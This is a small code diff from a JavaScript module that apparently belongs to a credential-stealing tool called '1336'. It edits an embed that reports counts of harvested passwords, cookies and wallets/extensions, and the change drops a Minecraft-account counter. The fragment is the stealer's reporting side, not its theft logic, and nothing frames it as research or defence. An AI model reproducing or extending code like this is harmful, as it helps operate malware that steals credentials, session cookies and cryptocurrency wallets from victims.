@@ -197,7 +197,7 @@ module.exports = (client) => {
     create_counter_embed() {
       let obj = {
         "title": `Thanks for using 1336`,
-        "description": `<a:1336:1026131793197400164> **${client.config.counter.passwords}  Passwords**\n<a:1336:1026131787157602375> **${client.config.counter.cookies} Cookies**\n<:1336:1026131791658110996> **${client.config.counter.wallets} Wallets/Extensions**\n<:1336:1026131791658110996> **${client.config.counter.minecraft} Minecraft**`,
+        "description": `<a:1336:1026131793197400164> **${client.config.counter.passwords}  Passwords**\n<a:1336:1026131787157602375> **${client.config.counter.cookies} Cookies**\n<:1336:1026131791658110996> **${client.config.counter.wallets} Wallets/Extensions**`,
         "footer": {
             text: client.utils.encryption.decryptData(client.config.embed.footer.text),
             icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
